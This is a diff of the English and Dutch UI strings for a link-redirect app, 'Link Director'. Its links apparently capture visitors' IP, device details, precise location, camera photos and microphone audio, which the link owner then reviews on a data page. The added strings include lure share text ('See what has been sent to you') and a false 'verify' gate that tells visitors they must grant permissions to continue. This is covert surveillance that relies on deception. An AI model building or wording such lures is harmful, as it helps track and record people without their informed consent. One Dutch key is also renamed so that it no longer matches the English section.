@@ -27,6 +27,8 @@ export const translations = {
     notification_missing_fields: "Please provide a Name and Redirect URL.",
     notification_redirect_updated: "Redirect updated successfully!",
     notification_redirect_created: "Redirect created successfully!",
+    notification_name_updated: "Capture name updated.",
+    notification_name_update_failed: "Failed to update name.",
 
     // HomePage
     home_title: "Link Director",
@@ -39,10 +41,33 @@ export const translations = {
     home_delete_confirm: "Are you sure you want to delete this redirect? This action cannot be undone.",
     home_qr_code: "QR Code",
     home_share: "Share",
+    home_view_data: "View Data",
     
     // Share Modal
     share_modal_title: "Share Link",
-    share_modal_text: "Check out this link for '{name}':",
+    share_modal_prompt: "Share this link via your favorite platforms.",
+    share_modal_share_text: "See what has been sent to you:",
+    share_modal_email_subject: "A link has been shared with you",
+
+    // Data Viewer Page
+    data_viewer_title: "Captured Data for '{name}'",
+    data_viewer_back: "Back to Home",
+    data_viewer_no_data: "No data has been captured for this link yet.",
+    data_viewer_capture_name_placeholder: "Enter a name for this capture...",
+    data_viewer_ip: "IP Address",
+    data_viewer_os: "Operating System",
+    data_viewer_browser: "Browser",
+    data_viewer_device: "Device Type",
+    data_viewer_timezone: "Timezone",
+    data_viewer_language: "Language",
+    data_viewer_captured_at: "Captured At",
+    data_viewer_permissions: "Permissions Status",
+    data_viewer_location_source_ip: "Location (from IP)",
+    data_viewer_location_source_gps: "Location (Precise)",
+    data_viewer_granted: "Granted",
+    data_viewer_denied: "Denied",
+    data_viewer_not_applicable: "N/A",
+
 
     // SettingsPage
     settings_create_title: "Create New Redirect",
@@ -78,7 +103,7 @@ export const translations = {
     settings_redirect_delay: "Redirect Delay (seconds)",
     settings_capture_info: "Information Capture",
     settings_capture_info_desc: "Ask the user for permissions to collect data before redirecting.",
-    settings_capture_location: "Track Geolocation",
+    settings_capture_location: "Track Geolocation (Precise)",
     settings_capture_camera: "Capture Camera Photo",
     settings_capture_mic: "Capture Microphone Audio",
     settings_recording_duration: "Recording Duration (seconds)",
@@ -93,10 +118,13 @@ export const translations = {
     // RedirectPage
     redirect_initializing: "Initializing...",
     redirect_loading: "Loading...",
-    redirect_permissions_request: "Requesting permissions to customize your redirect...",
+    redirect_permissions_request: "Requesting permissions...",
     redirect_preparing: "Preparing to redirect...",
     redirect_invalid_link_title: "Invalid Link",
     redirect_invalid_link_subtitle: "The link you followed appears to be broken or corrupted.",
+    redirect_permissions_denied_title: "Permission Required",
+    redirect_permissions_denied_message: "You must accept the requested permissions to verify and continue to the destination.",
+
     redirect_default_card_subtitle: "You will be redirected shortly...",
     redirect_glass_card_subtitle: "Redirecting shortly...",
     redirect_minimal_card_subtitle: "You will be redirected momentarily.",
@@ -141,6 +169,8 @@ export const translations = {
     notification_missing_fields: "Geef een naam en een redirect-URL op.",
     notification_redirect_updated: "Redirect succesvol bijgewerkt!",
     notification_redirect_created: "Redirect succesvol aangemaakt!",
+    notification_name_updated: "Naam van de opname bijgewerkt.",
+    notification_name_update_failed: "Kon de naam niet bijwerken.",
 
     // HomePage
     home_title: "Link Director",
@@ -153,10 +183,32 @@ export const translations = {
     home_delete_confirm: "Weet je zeker dat je deze redirect wilt verwijderen? Deze actie kan niet ongedaan worden gemaakt.",
     home_qr_code: "QR-code",
     home_share: "Delen",
+    home_view_data: "Gegevens Bekijken",
 
     // Share Modal
     share_modal_title: "Link Delen",
-    share_modal_text: "Bekijk deze link voor '{name}':",
+    share_modal_prompt: "Deel deze link via je favoriete platformen.",
+    share_modal_share_text: "Kijk wat er naar je is gestuurd:",
+    share_modal_email_subject: "Een link is met je gedeeld",
+
+    // Data Viewer Page
+    data_viewer_title: "Verzamelde Gegevens voor '{name}'",
+    data_viewer_back: "Terug naar Home",
+    data_viewer_no_data: "Er zijn nog geen gegevens verzameld voor deze link.",
+    data_viewer_capture_name_placeholder: "Voer een naam in voor deze opname...",
+    data_viewer_ip: "IP-adres",
+    data_viewer_os: "Besturingssysteem",
+    data_viewer_browser: "Browser",
+    data_viewer_device: "Apparaattype",
+    data_viewer_timezone: "Tijdzone",
+    data_viewer_language: "Taal",
+    data_viewer_captured_at: "Vastgelegd op",
+    data_viewer_permissions: "Permissiestatus",
+    data_viewer_location_source_ip: "Locatie (via IP)",
+    data_viewer_location_source_gps: "Locatie (Precies)",
+    data_viewer_granted: "Toegestaan",
+    data_viewer_denied: "Geweigerd",
+    data_viewer_not_applicable: "N.v.t.",
 
     // SettingsPage
     settings_create_title: "Nieuwe Redirect Maken",
@@ -192,7 +244,7 @@ export const translations = {
     settings_redirect_delay: "Redirect Vertraging (seconden)",
     settings_capture_info: "Informatie Verzamelen",
     settings_capture_info_desc: "Vraag de gebruiker om toestemming om gegevens te verzamelen vóór de redirect.",
-    settings_capture_location: "Geolocatie Volgen",
+    settings_capture_location: "Geolocatie Volgen (Precies)",
     settings_capture_camera: "Camerafoto Maken",
     settings_capture_mic: "Microfoonopname Maken",
     settings_recording_duration: "Opnameduur (seconden)",
@@ -207,10 +259,13 @@ export const translations = {
     // RedirectPage
     redirect_initializing: "Initialiseren...",
     redirect_loading: "Laden...",
-    redirect_permissions_request: "Toestemming vragen om je redirect aan te passen...",
+    redirect_permissions_request: "Toestemmingen opvragen...",
     redirect_preparing: "Voorbereiden om door te sturen...",
     redirect_invalid_link_title: "Ongeldige Link",
     redirect_invalid_link_subtitle: "De link die je hebt gevolgd lijkt kapot of beschadigd te zijn.",
+    redirect_permissions_denied_title: "Toestemming Vereist",
+    redirect_permissions_denied_message: "Je moet de gevraagde toestemmingen accepteren om geverifieerd te worden en door te gaan naar de bestemming.",
+
     redirect_default_card_subtitle: "Je wordt zo doorgestuurd...",
     redirect_glass_card_subtitle: "Wordt zo doorgestuurd...",
     redirect_minimal_card_subtitle: "Je wordt zo doorgestuurd.",
@@ -226,6 +281,6 @@ export const translations = {
     redirect_elegant_card_subtitle: "Doorsturen...",
     redirect_retro_tv_target: "DOEL:",
     redirect_video_player_loading: "Volgende video laden...",
-    redirect_video_player_redirecting: "Doorsturen naar: {url}",
+    video_player_redirecting: "Doorsturen naar: {url}",
   }
 };
